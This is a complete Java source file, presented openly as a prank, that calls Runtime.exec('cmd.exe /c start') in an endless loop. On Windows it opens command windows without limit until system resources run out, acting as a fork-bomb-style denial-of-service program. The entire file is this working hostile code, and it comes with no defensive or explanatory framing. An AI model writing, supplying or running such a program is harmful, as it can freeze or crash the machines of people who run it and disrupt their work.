import java.io.IOException;

/**
 * The very simple, famous, and annoying unlimited CMD windows program
 * @author Josias Sena
 */
public class CMDWindow {

	public static void main(String[] args) {
		try {
			Runtime runTime = Runtime.getRuntime();

			while (true) {
				Process process = runTime.exec("cmd.exe /c start");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
